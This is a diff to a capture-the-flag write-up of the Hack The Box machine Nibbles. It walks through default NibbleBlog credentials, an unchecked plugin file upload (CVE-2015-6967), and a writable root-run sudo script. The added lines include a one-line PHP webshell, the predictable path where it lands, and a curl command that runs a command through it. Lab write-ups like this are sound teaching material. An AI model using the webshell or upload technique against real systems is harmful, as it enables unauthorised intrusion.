@@ -5,6 +5,7 @@ subtitle: "default NibbleBlog creds to a plugin file upload shell, then a writab
 date: 2023-02-02
 tags: [htb, linux, file-upload, sudo, privilege-escalation]
 category: writeups
+kind: machine
 tldr: "A hidden /nibbleblog directory runs NibbleBlog 4.0.3 with admin:nibbles. The My Image plugin lets me upload a PHP file with no checks for a reverse shell as nibbler. sudo -l shows a writable, root-run monitor.sh, so I append a shell and run it for root."
 ---
 
@@ -40,17 +41,33 @@ The README identifies the CMS as NibbleBlog 4.0.3 (codename Coffee). I formatted
 curl -s http://10.129.165.135/nibbleblog/content/private/config.xml | xmllint --format -
 ```
 
-`users.xml` confirmed the username is `admin`, and `nibbles` showed up repeatedly across the config, a good guess for the password. `admin:nibbles` logged into the panel.
+`users.xml` confirmed the username is `admin`, and `nibbles` showed up repeatedly across the config, a good guess for the password. `admin:nibbles` logged into the panel. One thing to watch: NibbleBlog records failed logins in `users.xml` as a per-IP blacklist with timestamps, so blind brute forcing locks you out fast. The box name guess landed on the first try and avoided that.
 
 ## foothold
 
-NibbleBlog 4.0.3 has a known arbitrary file upload in the My Image plugin. It does not check the uploaded file type, so I uploaded a PHP file directly:
+NibbleBlog 4.0.3 has a known arbitrary file upload in the My Image plugin, CVE-2015-6967. It does not check the uploaded file type, so I uploaded a PHP file directly through the plugin config page:
 
 ```
-http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
+http://10.129.165.135/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
 ```
 
-Browsing to the uploaded shell executed it, giving a reverse shell as `nibbler`. The user flag sits in `/home/nibbler/user.txt`.
+The plugin always saves the upload as `image.php` regardless of the name I gave it, at a predictable path, so I could reach my shell at:
+
+```
+http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+I uploaded a one-liner webshell first to get command execution, then upgraded to a reverse shell:
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+```bash
+curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'
+```
+
+From there a standard mkfifo reverse shell landed me as `nibbler`. The user flag sits in `/home/nibbler/user.txt`.
 
 ## user
 
@@ -77,3 +94,7 @@ The script runs as root, the appended line fires my shell, and the listener catc
 ## takeaway
 
 Nothing exotic here, just a stack of small misconfigurations: a "nothing interesting" comment pointing at the real app, a CMS password equal to the box name, an upload plugin that trusts the extension, and a root-run script living in a user-writable path. The only careful move worth keeping is appending rather than overwriting the sudo script, so you do not break the thing you need to keep running.
+
+## references
+
+- [0xdf, HTB: Nibbles](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)
